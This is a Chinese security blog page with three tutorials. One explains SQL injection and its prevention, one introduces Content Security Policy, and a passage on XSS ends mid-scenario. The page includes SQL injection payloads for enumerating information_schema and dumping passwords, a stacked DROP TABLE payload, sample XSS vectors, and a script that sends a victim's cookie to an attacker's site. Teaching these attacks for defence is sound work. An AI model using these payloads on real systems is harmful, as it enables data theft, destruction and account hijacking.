        <h3 id="如何理解SQL注入（攻击）？"><a href="#如何理解SQL注入（攻击）？" class="headerlink" title="如何理解SQL注入（攻击）？"></a>如何理解SQL注入（攻击）？</h3><ol>
<li>SQL注入是一种将SQL代码添加到输入参数中，传递到服务器解析并执行的一种攻击手法。</li>
<li>SQL注入攻击是输入参数未经过滤，然后直接拼接到SQL语句当中解析，执行达到预想之外的一种行为，称之为SQL注入攻击。</li>
</ol>
<h3 id="SQL注入是怎么产生的？"><a href="#SQL注入是怎么产生的？" class="headerlink" title="SQL注入是怎么产生的？"></a>SQL注入是怎么产生的？</h3><ol>
<li>WEB开发人员无法保证所有的输入都已经过滤</li>
<li>攻击者利用发送给SQL服务器的输入参数构造可执行的SQL代码（可加入到get请求、post请求、http头信息、cookie中）</li>
<li>数据库未做相应的安全配置</li>
</ol>
<h3 id="如何进行SQL注入攻击"><a href="#如何进行SQL注入攻击" class="headerlink" title="如何进行SQL注入攻击"></a>如何进行SQL注入攻击</h3><p>要想发动sql注入攻击，就要知道正在使用的系统数据库，不然就没法提取重要的数据。<br>首先从Web应用技术上就给我们提供了判断的线索：</p>
<ul>
<li>ASP和.NET：Microsoft SQL Server</li>
<li>PHP：MySQL、PostgreSQL</li>
<li>Java：Oracle、MySQL</li>
</ul>
<p>Web容器也给我们提供了线索，比如安装IIS作为服务器平台，后台数据及很有可能是Microsoft SQL Server，而允许Apache和PHP的Linux服务器就很有可能使用开源的数据库，比如MySQL和PostgreSQL。</p>
<h5 id="基于错误识别数据库"><a href="#基于错误识别数据库" class="headerlink" title="基于错误识别数据库"></a>基于错误识别数据库</h5><p>大多数情况下，要了解后台是什么数据库，只需要看一条详细的错误信息即可。比如判断我们事例中使用的数据库，我们加个单引号。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error:You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''' at line 1</span></span><br></pre></td></tr></table></figure></p>
<p>从错误信息中，我们就可以发现是MySQL。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Microsoft OLE DB Provider for ODBC Drivers 错误 '80040e14'</span><br><span class="line"> [Microsoft][ODBC SQL Server Driver][SQL Server]Line 1:</span><br></pre></td></tr></table></figure>
<p>上面错误信息可以发现是Microsoft SQL Server，如果错误信息开头是ORA，就可以判断数据库是Oracle，很简单，道理都是一样的，就不一一列举了。</p>
<h6 id="UINON语句提取数据"><a href="#UINON语句提取数据" class="headerlink" title="UINON语句提取数据"></a>UINON语句提取数据</h6><p>UNION操作符可以合并两条或多条SELECT语句的查询结果，基本语法如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">column</span><span class="number">-1</span> <span class="keyword">column</span><span class="number">-2</span> <span class="keyword">from</span> <span class="keyword">table</span><span class="number">-1</span></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">column</span><span class="number">-1</span> <span class="keyword">column</span><span class="number">-2</span> <span class="keyword">from</span> <span class="keyword">table</span><span class="number">-2</span></span><br></pre></td></tr></table></figure></p>
<h6 id="枚举数据库"><a href="#枚举数据库" class="headerlink" title="枚举数据库"></a>枚举数据库</h6><p>我们只以MySQL数据库为例了，枚举数据库并提取数据遵循一种层次化的方法，首先我们提取数据库名称，然后提取表，再到列，最后才是数据本身。要想获取远程数据库的表、列，就要访问专门保存描述各种数据库结构的表。通常将这些结构描述信息成为元数据。在MySQL中，这些表都保存在information_schema数据库中</p>
<h6 id="第一步：提取数据库"><a href="#第一步：提取数据库" class="headerlink" title="第一步：提取数据库"></a>第一步：提取数据库</h6><p>在MySQL中，数据库名存放在information_schema数据库下schemata表schema_name字段中<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union <span class="keyword">select</span> <span class="literal">null</span>,schema_name,<span class="literal">null</span> <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure></p>
<h6 id="第二步：提取表名"><a href="#第二步：提取表名" class="headerlink" title="第二步：提取表名"></a>第二步：提取表名</h6><p>在MySQL中，表名存放在information_schema数据库下tables表table_name字段中<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union <span class="keyword">select</span> <span class="literal">null</span>,table_name,<span class="literal">null</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'ichunqiu'</span></span><br></pre></td></tr></table></figure></p>
<h6 id="第三步：提取字段名"><a href="#第三步：提取字段名" class="headerlink" title="第三步：提取字段名"></a>第三步：提取字段名</h6><p>在MySQL中，字段名存放在information_schema数据库下columns表column_name字段中<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="literal">null</span>,column_name,<span class="literal">null</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">and</span> table_schema=<span class="string">''</span></span><br></pre></td></tr></table></figure></p>
<h6 id="第四步：提取数据"><a href="#第四步：提取数据" class="headerlink" title="第四步：提取数据"></a>第四步：提取数据</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span>,<span class="literal">null</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure>
<h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><h4 id="布尔型注入"><a href="#布尔型注入" class="headerlink" title="布尔型注入"></a>布尔型注入</h4><p>例如：在参数后面加上or 1=1，可返回所有数据，因为 or 1=1永远为真</p>
<h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>在参数后面加上：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="keyword">select</span> <span class="keyword">column</span><span class="number">-1</span> <span class="keyword">column</span><span class="number">-2</span> <span class="keyword">from</span> <span class="keyword">table</span><span class="number">-2</span></span><br></pre></td></tr></table></figure></p>
<h4 id="多语句注入"><a href="#多语句注入" class="headerlink" title="多语句注入"></a>多语句注入</h4><p>在参数后面加上：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">drop</span> <span class="keyword">table</span> a; <span class="keyword">select</span> * <span class="keyword">from</span> tableb;</span><br></pre></td></tr></table></figure></p>
<h4 id="字符串注册"><a href="#字符串注册" class="headerlink" title="字符串注册"></a>字符串注册</h4><p>‘#’：’#’后所有的字符串都会被当成注释来处理用户名输入：user’#（单引号闭合user左边的单引号），密码随意输入，如：111，然后点击提交按钮。等价于SQL语句：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> username = <span class="string">'user'</span><span class="comment">#'ADN password = '111'</span></span><br></pre></td></tr></table></figure></p>
<h3 id="如何预防SQL注入"><a href="#如何预防SQL注入" class="headerlink" title="如何预防SQL注入"></a>如何预防SQL注入</h3><ol>
<li>严格检查输入变量的类型和格式<br> 对于整数参数，加判断条件：不能为空、参数类型必须为数字<br> 对于字符串参数，可以使用正则表达式进行过滤：如：必须为[0-9a-zA-Z]范围内的字符串</li>
<li>对URL进行编码</li>
<li>对进入数据库的特殊字符（’”\尖括号&amp;*;等）进行转义处理，或编码转换</li>
<li>所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中，即不要直接拼接SQL语句</li>
<li>避免网站打印出SQL错误信息，比如类型错误、字段不匹配等，把代码里的SQL语句暴露出来，以防止攻击者利用这些错误信息进行SQL注入。</li>
<li>利用sql的预编译机制<br> 把sql语句的模板（变量采用占位符进行占位）发送给数据库服务器，数据库服务器对sql语句的模板进行编译，编译之后根据语句的优化分析对相应的索引进行优化，在最终绑定参数时把相应的参数传送给数据库服务器，直接进行执行，节省了sql查询时间，以及数据库服务器的资源，达到一次编译、多次执行的目的，除此之外，还可以防止SQL注入。具体是怎样防止SQL注入的呢？实际上当将绑定的参数传到数据库服务器，服务器对参数进行编译，即填充到相应的占位符的过程中，做了转义操作。</li>
</ol>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/github_36032947/article/details/78442189" target="_blank" rel="noopener">https://blog.csdn.net/github_36032947/article/details/78442189</a><br><a href="https://www.jianshu.com/p/ba35a7e1c67d" target="_blank" rel="noopener">https://www.jianshu.com/p/ba35a7e1c67d</a><br><a href="https://paper.seebug.org/15/" target="_blank" rel="noopener">https://paper.seebug.org/15/</a><br><a href="https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md" target="_blank" rel="noopener">https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://shouliang.github.io/2017/02/23/网络安全/SQL注入/" data-id="cjujf4p5c0077cp6f0xqmn3ea" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-网络安全/CSP简介" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/02/20/网络安全/CSP简介/" class="article-date">
  <time datetime="2017-02-20T06:45:23.000Z" itemprop="datePublished">2017-02-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/20/网络安全/CSP简介/">CSP简介</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>跨域脚本攻击 XSS是最常见、危害最大的网页安全漏洞。为了防止它们，要采取很多编程措施，非常麻烦。很多人提出，能不能根本上解决问题，浏览器自动禁止外部注入恶意脚本？这就是”网页安全政策”（Content Security Policy，缩写 CSP）的来历。</p>
<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。</p>
<p>CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。</p>
<p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段。<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/csp01.jpg" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &apos;self&apos;; object-src &apos;none&apos;;</span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure>
<p>另一种是通过网页的<meta>标签。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;; object-src &apos;none&apos;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>上面代码中，CSP 做了如下配置。</p>
<ul>
<li>脚本：只信任当前域名</li>
<li><code>&lt;object&gt;</code>标签：不信任任何URL，即不加载任何资源</li>
<li>样式表：只信任<code>cdn.example.org</code>和<code>third-party.org</code></li>
<li>框架（frame）：必须使用HTTPS协议加载</li>
<li>其他资源：没有限制</li>
</ul>
<p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
<h2 id="二、限制选项"><a href="#二、限制选项" class="headerlink" title="二、限制选项"></a>二、限制选项</h2><p>CSP 提供了很多限制选项，涉及安全的各个方面。</p>
<h3 id="2-1-资源加载限制"><a href="#2-1-资源加载限制" class="headerlink" title="2.1 资源加载限制"></a>2.1 资源加载限制</h3><p>以下选项限制各类资源的加载。</p>
<ul>
<li><strong>script-src</strong>：外部脚本</li>
<li><strong>style-src</strong>：样式表</li>
<li><strong>img-src</strong>：图像</li>
<li><strong>media-src</strong>：媒体文件（音频和视频）</li>
<li><strong>font-src</strong>：字体文件</li>
<li><strong>object-src</strong>：插件（比如 Flash）</li>
<li><strong>child-src</strong>：框架</li>
<li><strong>frame-ancestors</strong>：嵌入的外部资源（比如<code>&lt;frame&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;embed&gt;</code>和<code>&lt;applet&gt;</code>）</li>
<li><strong>connect-src</strong>：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li>
<li><strong>worker-src</strong>：<code>worker</code>脚本</li>
<li><strong>manifest-src</strong>：manifest 文件</li>
</ul>
<h3 id="2-2-default-src"><a href="#2-2-default-src" class="headerlink" title="2.2 default-src"></a>2.2 default-src</h3><p><code>default-src</code>用来设置上面各个选项的默认值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;</span><br></pre></td></tr></table></figure>
<p>上面代码限制<strong>所有的</strong>外部资源，都只能从当前域名加载。</p>
<p>如果同时设置某个单项限制（比如<code>font-src</code>）和<code>default-src</code>，前者会覆盖后者，即字体文件会采用<code>font-src</code>的值，其他资源依然采用<code>default-src</code>的值。</p>
<h3 id="2-3-URL-限制"><a href="#2-3-URL-限制" class="headerlink" title="2.3 URL 限制"></a>2.3 URL 限制</h3><p>有时，网页会跟其他 URL 发生联系，这时也可以加以限制。</p>
<ul>
<li><strong>frame-ancestors</strong>：限制嵌入框架的网页</li>
<li><strong>base-uri</strong>：限制<code>&lt;base#href&gt;</code></li>
<li><strong>form-action</strong>：限制<code>&lt;form#action&gt;</code></li>
</ul>
<h3 id="2-4-其他限制"><a href="#2-4-其他限制" class="headerlink" title="2.4 其他限制"></a>2.4 其他限制</h3><p>其他一些安全相关的功能，也放在了 CSP 里面。</p>
<ul>
<li><strong>block-all-mixed-content</strong>：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li>
<li><strong>upgrade-insecure-requests</strong>：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li>
<li><strong>plugin-types</strong>：限制可以使用的插件格式</li>
<li><strong>sandbox</strong>：浏览器行为的限制，比如不能有弹出窗口等。</li>
</ul>
<h3 id="2-5-report-uri"><a href="#2-5-report-uri" class="headerlink" title="2.5 report-uri"></a>2.5 report-uri</h3><p>有时，我们不仅希望防止 XSS，还希望记录此类行为。<code>report-uri</code>就用来告诉浏览器，应该把注入行为报告给哪个网址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; ...; report-uri /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure>
<p>上面代码指定，将注入行为报告给<code>/my_amazing_csp_report_parser</code>这个 URL。</p>
<p>浏览器会使用<code>POST</code>方法，发送一个JSON对象，下面是一个例子。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;csp-report&quot;: &#123;</span><br><span class="line">    &quot;document-uri&quot;: &quot;http://example.org/page.html&quot;,</span><br><span class="line">    &quot;referrer&quot;: &quot;http://evil.example.com/&quot;,</span><br><span class="line">    &quot;blocked-uri&quot;: &quot;http://evil.example.com/evil.js&quot;,</span><br><span class="line">    &quot;violated-directive&quot;: &quot;script-src &apos;self&apos; https://apis.google.com&quot;,</span><br><span class="line">    &quot;original-policy&quot;: &quot;script-src &apos;self&apos; https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://7xq1il.com1.z0.glb.clouddn.com/csp02.png" alt="img"></p>
<h2 id="三、Content-Security-Policy-Report-Only"><a href="#三、Content-Security-Policy-Report-Only" class="headerlink" title="三、Content-Security-Policy-Report-Only"></a>三、Content-Security-Policy-Report-Only</h2><p>除了<code>Content-Security-Policy</code>，还有一个<code>Content-Security-Policy-Report-Only</code>字段，表示不执行限制选项，只是记录违反限制的行为。<br>它必须与<code>report-uri</code>选项配合使用。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy-Report-Only: <span class="keyword">default</span>-src <span class="string">'self'</span>; ...; report-uri /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure>
<h2 id="四、选项值"><a href="#四、选项值" class="headerlink" title="四、选项值"></a>四、选项值</h2><p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p>
<ul>
<li>主机名：<code>example.org</code>，<code>https://example.com:443</code></li>
<li>路径名：<code>example.org/resources/js/</code></li>
<li>通配符：<code>*.example.org</code>，<code>*://*.example.com:*</code>（表示任意协议、任意子域名、任意端口）</li>
<li>协议名：<code>https:</code>、<code>data:</code></li>
<li>关键字<code>&#39;self&#39;</code>：当前域名，需要加引号</li>
<li>关键字<code>&#39;none&#39;</code>：禁止加载任何外部资源，需要加引号</li>
</ul>
<p>多个值也可以并列，用空格分隔。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'self'</span> https:<span class="comment">//apis.google.com</span></span><br></pre></td></tr></table></figure></p>
<p>如果同一个限制选项使用多次，只有第一次会生效。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 错误的写法</span><br><span class="line">script-src https:<span class="comment">//host1.com; script-src https://host2.com</span></span><br><span class="line"></span><br><span class="line"># 正确的写法</span><br><span class="line">script-src https:<span class="comment">//host1.com https://host2.com</span></span><br></pre></td></tr></table></figure></p>
<p>如果不设置某个限制选项，就是默认允许任何值。</p>
<h2 id="五、script-src-的特殊值"><a href="#五、script-src-的特殊值" class="headerlink" title="五、script-src 的特殊值"></a>五、script-src 的特殊值</h2><p>除了常规值，<code>script-src</code>还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p>
<ul>
<li><p><strong>‘unsafe-inline’</strong>：允许执行页面内嵌的<code>&amp;lt;script&gt;</code>标签和事件监听函数</p>
</li>
<li><p><strong>unsafe-eval</strong>：允许将字符串当作代码执行，比如使用<code>eval</code>、<code>setTimeout</code>、<code>setInterval</code>和<code>Function</code>等函数。</p>
</li>
<li><p><strong>nonce值</strong>：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</p>
</li>
<li><p><strong>hash值</strong>：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</p>
</li>
</ul>
<p>以 Node.js 为例, 计算脚本的 hashes 值:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHashByCode</span>(<span class="params">code, algorithm = <span class="string">'sha256'</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> algorithm + <span class="string">'-'</span> + crypto.createHash(algorithm).update(code, <span class="string">'utf8'</span>).digest(<span class="string">"base64"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getHashByCode(<span class="string">'console.log("hello world");'</span>); <span class="comment">// 'sha256-wxWy1+9LmiuOeDwtQyZNmWpT0jqCUikqaqVlJdtd</span></span><br></pre></td></tr></table></figure></p>
<p>nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'nonce-EDNnf03nceIOfn39fn3e9h3sdfa'</span></span><br></pre></td></tr></table></figure>
<p>页面内嵌脚本，必须有这个token才能执行。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt;</span><br><span class="line">   <span class="comment">// some code</span></span><br><span class="line"> &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>hash值的例子如下，服务器给出一个允许执行的代码的hash值。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng='</span></span><br></pre></td></tr></table></figure>
<p>下面的代码就会允许执行，因为hash值相符。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'Hello, world.'</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>注意，计算hash值的时候，<script>标签不算在内。<br>除了<code>script-src</code>选项，nonce值和hash值还可以用在<code>style-src</code>选项，控制页面内嵌的样式表。</p>
<h2 id="六、注意点"><a href="#六、注意点" class="headerlink" title="六、注意点"></a>六、注意点</h2><p>（1）<code>script-src</code>和<code>object-src</code>是必设的，除非设置了<code>default-src</code>。</p>
<p>因为攻击者只要能注入脚本，其他限制都可以规避。而<code>object-src</code>必设是因为 Flash 里面可以执行外部脚本。</p>
<p>（2）<code>script-src</code>不能使用<code>unsafe-inline</code>关键字（除非伴随一个nonce值），也不能允许设置<code>data:</code>URL。</p>
<p>下面是两个恶意攻击的例子。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"x"</span> onerror=<span class="string">"evil()"</span>&gt;</span><br><span class="line">&lt;script src=<span class="string">"data:text/javascript,evil()"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>（3）必须特别注意 JSONP 的回调函数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">  src=<span class="string">"/path/jsonp?callback=alert(document.domain)//"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面的代码中，虽然加载的脚本来自当前域名，但是通过改写回调函数，攻击者依然可以执行恶意代码。</p>
<h3 id="原文：http-www-ruanyifeng-com-blog-2016-09-csp-html"><a href="#原文：http-www-ruanyifeng-com-blog-2016-09-csp-html" class="headerlink" title="原文：http://www.ruanyifeng.com/blog/2016/09/csp.html"></a>原文：<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html">http://www.ruanyifeng.com/blog/2016/09/csp.html</a></h3></script></p>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://shouliang.github.io/2017/02/20/网络安全/CSP简介/" data-id="cjujf4p5b0074cp6frb4yxn84" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-网络安全/XSS攻击及预防" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/02/18/网络安全/XSS攻击及预防/" class="article-date">
  <time datetime="2017-02-18T06:45:23.000Z" itemprop="datePublished">2017-02-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/18/网络安全/XSS攻击及预防/">XSS攻击及预防</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="XSS攻击是什么"><a href="#XSS攻击是什么" class="headerlink" title="XSS攻击是什么"></a>XSS攻击是什么</h2><ul>
<li>XSS又称CSS，全称Cross SiteScript跨站脚本攻击的缩写，是一种网站应用程序的安全漏洞攻击，是代码注入的一种。</li>
<li>通常是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。</li>
<li>这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。</li>
<li>攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和盗取用户Cookie、破坏页面结构、重定向到其它网站等</li>
</ul>
<h3 id="XSS攻击基本原理——代码注入"><a href="#XSS攻击基本原理——代码注入" class="headerlink" title="XSS攻击基本原理——代码注入"></a>XSS攻击基本原理——代码注入</h3><p>在web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进行攻击——将恶意代码注入合法代码里隐藏起来，再诱发恶意代码，从而进行各种各样的非法活动。只要破坏跨层协议的数据/指令的构造，我们就能攻击。<br>历史悠久的<code>SQL注入</code>和<code>XSS注入</code>都是这种攻击方式的典范。现如今，随着参数化查询的普及，我们已经离<code>SQL注入</code>很远了。但是，历史同样悠久的<code>XSS</code>却没有远离我们。<br><code>XSS</code>的基本实现思路很简单——比如<code>持久型XSS</code>通过一些正常的站内交互途径，例如发布评论，提交含有<code>JavaScript</code>的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本，从而被攻击。</p>
<p>攻击分类举例</p>
<h3 id="DOM-based-XSS"><a href="#DOM-based-XSS" class="headerlink" title="DOM-based XSS"></a>DOM-based XSS</h3><p>基于DOM的XSS，通过对具体DOM代码进行分析，根据实际情况构造dom节点进行XSS跨站脚本攻击，该攻击特点是中招的人是少数人。<br><strong>场景一</strong>：<br>当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">language</span>=<span class="string">"java"</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span> <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span>%&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPEhtmlPUBLIC"-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   页面内容：<span class="tag">&lt;<span class="name">%=request.getParameter("content")%</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：<a href="http://www.a.com?content=" target="_blank" rel="noopener">http://www.a.com?content=</a><script>window.open(“<a href="http://www.b.com?param=”+document.cookie">www.b.com?param=”+document.cookie</a>)</script>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！这个过程中，受害者只有Tom自己。那当我在浏览器输入a.com?content=<script>alert(“xss”)</script>，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己，那我如何攻击别人并且获利呢？</p>
